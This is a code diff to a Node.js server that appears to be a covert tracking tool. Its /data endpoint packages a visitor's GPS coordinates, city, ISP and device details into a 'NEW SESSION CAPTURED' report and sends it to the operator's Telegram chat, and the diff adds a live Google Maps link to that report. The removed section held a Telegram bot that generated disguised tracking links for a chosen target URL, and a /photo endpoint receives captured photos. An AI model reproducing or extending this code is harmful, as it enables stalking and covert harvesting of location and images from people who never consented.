@@ -84,6 +84,12 @@ app.post("/data", async (req, res) => {
 
   const val = (v) => v || "N/A";
 
+  // ✅ LIVE MAP LINK
+  let mapLink = "❌ Not Available";
+  if (data.Location?.Latitude && data.Location?.Longitude) {
+    mapLink = `https://maps.google.com/?q=${data.Location.Latitude},${data.Location.Longitude}`;
+  }
+
   try {
     const msg = `
 🖥️ <b>NEW SESSION CAPTURED</b> 🖥️
@@ -138,7 +144,11 @@ app.post("/data", async (req, res) => {
 📌 LAT       ➤ ${val(data.Location?.Latitude)}
 📌 LONG      ➤ ${val(data.Location?.Longitude)}
 🎯 ACCURACY  ➤ ${val(data.Location?.Accuracy)}
-🗺 MAP       ➤ ${val(data.Permissions?.Location)}
+🗺 MAP       ➤ ${
+  mapLink !== "❌ Not Available"
+    ? `<a href="${mapLink}">📍 Open Live Location</a>`
+    : "❌ Permission Denied"
+}
 
 🌍 <b>GEO DATABASE</b>
 ════════════════════
@@ -146,6 +156,14 @@ app.post("/data", async (req, res) => {
 🏙 REGION    ➤ ${val(data.Location?.Region)}
 🏠 CITY      ➤ ${val(data.Location?.City)}
 📡 ISP       ➤ ${val(data.Location?.ISP)}
+
+🌐 <b>LIVE TRACKING</b>
+════════════════════
+${
+  mapLink !== "❌ Not Available"
+    ? `<a href="${mapLink}">🛰️ View on Google Maps</a>`
+    : "❌ Location Not Available"
+}
 
 📲 <b>DEVICE TYPE</b>
 ════════════════════
@@ -172,9 +190,7 @@ app.post("/data", async (req, res) => {
 
     await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
       method: "POST",
-      headers: {
-        "Content-Type": "application/json"
-      },
+      headers: { "Content-Type": "application/json" },
       body: JSON.stringify({
         chat_id: chatId,
         text: msg,
@@ -226,67 +242,6 @@ app.post("/photo", async (req, res) => {
 
   } catch (err) {
     console.log("PHOTO ERROR:", err);
-  }
-
-  res.sendStatus(200);
-});
-
-// ===== TELEGRAM =====
-app.post(`/bot${BOT_TOKEN}`, async (req, res) => {
-  const msg = req.body.message;
-  if (!msg) return res.sendStatus(200);
-
-  const chatId = msg.chat.id;
-  const text = msg.text || "";
-
-  const db = loadDB();
-
-  if (text === "/start") {
-    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({
-        chat_id: chatId,
-        text: "👋 Welcome!\n\nUse /create to generate tracking link"
-      })
-    });
-  }
-
-  else if (text === "/create") {
-    db[chatId] = { waiting: true };
-    saveDB(db);
-
-    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({
-        chat_id: chatId,
-        text: "Send target URL"
-      })
-    });
-  }
-
-  else if (db[chatId]?.waiting) {
-    const id = generateId();
-
-    db[id] = {
-      owner: chatId,
-      targetUrl: text
-    };
-
-    db[chatId].waiting = false;
-    saveDB(db);
-
-    const link = `https://zs-trace.onrender.com/pro/${id}`;
-
-    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({
-        chat_id: chatId,
-        text: `✅ Link Created:\n${link}`
-      })
-    });
   }
 
   res.sendStatus(200);
